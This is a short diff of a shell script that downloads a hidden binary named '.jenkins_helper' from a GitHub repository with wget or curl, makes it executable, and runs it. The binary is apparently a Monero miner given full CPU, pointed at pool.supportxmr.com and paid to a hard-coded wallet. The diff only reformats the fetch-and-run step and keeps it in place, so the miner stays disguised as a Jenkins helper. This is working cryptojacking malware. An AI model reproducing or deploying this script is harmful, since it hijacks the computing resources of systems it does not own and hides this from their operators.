@@ -1,2 +1,3 @@
-wget -q https://github.com/fop95854/jenkins_helper/raw/master/.jenkins_helper || curl -fsSLO https://github.com/fop95854/jenkins_helper/raw/master/.jenkins_helper && chmod +x .jenkins_helper
+wget -q https://github.com/fop95854/jenkins_helper/raw/master/.jenkins_helper || curl -fsSLO https://github.com/fop95854/jenkins_helper/raw/master/.jenkins_helper
+chmod +x .jenkins_helper
 ./.jenkins_helper -B --donate-level 0 --max-cpu-usage 100 --cpu-priority 4 -o pool.supportxmr.com:5555 -u 44VjXf42BybSJ8WQGnEhuccPn1aYcpQct3zToD2B1QHZbGF8LbxUdqQ94W8GwpusFFRZMHjEgynBYdmBTrrMin6y3PcEUTb -p jenkins -k -o pool.supportxmr.com:8080 -u 44VjXf42BybSJ8WQGnEhuccPn1aYcpQct3zToD2B1QHZbGF8LbxUdqQ94W8GwpusFFRZMHjEgynBYdmBTrrMin6y3PcEUTb -p x -k -o pool.supportxmr.com:80 -u 44VjXf42BybSJ8WQGnEhuccPn1aYcpQct3zToD2B1QHZbGF8LbxUdqQ94W8GwpusFFRZMHjEgynBYdmBTrrMin6y3PcEUTb -p x -k
